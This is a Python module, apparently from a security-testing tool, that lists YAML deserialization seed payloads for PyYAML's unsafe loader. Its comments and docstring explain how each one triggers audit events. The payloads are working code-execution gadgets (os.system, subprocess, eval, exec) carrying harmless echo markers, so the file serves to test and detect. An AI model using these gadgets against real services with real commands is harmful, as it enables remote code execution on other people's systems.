"""deserialization sink-family seeds (yaml.unsafe_load, pickle.loads).

These are YAML payloads — text inputs that PyYAML's UnsafeLoader interprets
as constructors. The marker arrives at the sink either as the argument to
the called function (`os.system("echo {MARKER}")` → marker in `os.system`
audit args) or as the imported module name (`!!python/name:` → marker in
`import` audit args).

Pickle bytes payloads are handled in v0.4 — they require `kind: "bytes"` and
content-addressed REDUCE-opcode construction.

Source: PayloadsAllTheThings — Insecure Deserialization / Python
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md
"""

from __future__ import annotations

SEEDS: list[str] = [
    # --- !!python/object/apply: invoke a callable with positional args
    '!!python/object/apply:os.system ["echo {MARKER}"]',
    '!!python/object/apply:subprocess.getoutput ["echo {MARKER}"]',
    '!!python/object/apply:os.popen ["echo {MARKER}"]',
    '!!python/object/apply:builtins.eval ["\'{MARKER}\'"]',
    '!!python/object/apply:builtins.exec ["print(\'{MARKER}\')"]',
    # --- !!python/object/new: construct an object with positional args
    '!!python/object/new:str ["{MARKER}"]',
    # --- !!python/name: imports a callable; marker carried as identifier suffix
    "!!python/name:os.system  # {MARKER}",
    # --- !!python/module: triggers import event for an attacker-named module
    "!!python/module:not_a_module_{MARKER}",
    # --- multi-line YAML form: subprocess gadget
    '!!python/object/new:subprocess.getoutput\n- "echo {MARKER}"',
    # --- builtins.range: harmless side effect, marker as comment
    "!!python/object/apply:builtins.range [1, 2]  # {MARKER}",
]
